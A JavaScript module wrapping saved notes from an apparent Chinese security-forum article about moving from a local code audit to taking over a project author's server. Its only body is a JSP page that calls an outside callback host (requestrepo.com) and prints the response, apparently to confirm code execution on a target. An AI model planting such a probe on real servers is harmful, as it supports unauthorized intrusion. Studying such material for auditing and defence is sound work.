const n=`# \u6587\u7AE0 - \u4ECE\u672C\u5730\u4EE3\u7801\u5BA1\u8BA1\u5230\u62FF\u4E0B\u9879\u76EE\u4F5C\u8005\u670D\u52A1\u5668\uFF1F  - \u5148\u77E5\u793E\u533A

Created: March 23, 2025 4:37 PM
URL: https://xz.aliyun.com/news/16984?time__1311=eqUxnDRQDQdQw2DBkodoRDGqAKq5hu2bD&u_atoken=59d0c61391fad769f69103961cdb7235&u_asig=1a0c399a17427185503874203e012c
\u6587\u7AE0\u4E8C\u7EA7\u7C7B\u522B: 0Day\u6316\u6398-\u6CE8\u610F\u56FE\u7247\u624B\u52A8\u62D6\u8FDB\u6765
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u4EE3\u7801\u5BA1\u8BA1

<%@ page import="java.net.HttpURLConnection" %>

<%@ page import="java.net.URL" %>

<%@ page import="java.io.BufferedReader" %>

<%@ page import="java.io.InputStreamReader" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%

String targetUrl = "https://oynkd4m9.requestrepo.com"; // \u66FF\u6362\u4E3A\u4F60\u7684\u76EE\u6807URL

URL url = new URL(targetUrl);

HttpURLConnection connection = (HttpURLConnection) url.openConnection();

connection.setRequestMethod("GET");

int responseCode = connection.getResponseCode();

out.println("Response Code: " + responseCode + "");

BufferedReader in = null;

StringBuilder responseBody = new StringBuilder();

try {

in = new BufferedReader(new InputStreamReader(connection.getInputStream()));

String inputLine;

while ((inputLine = in.readLine()) != null) {

responseBody.append(inputLine);

}

} finally {

if (in != null) {

in.close();

}

}

// \u6253\u5370\u7ED3\u679C

out.println("Response Body:");

out.println("" + responseBody.toString() + "");

%>`;export{n as _};
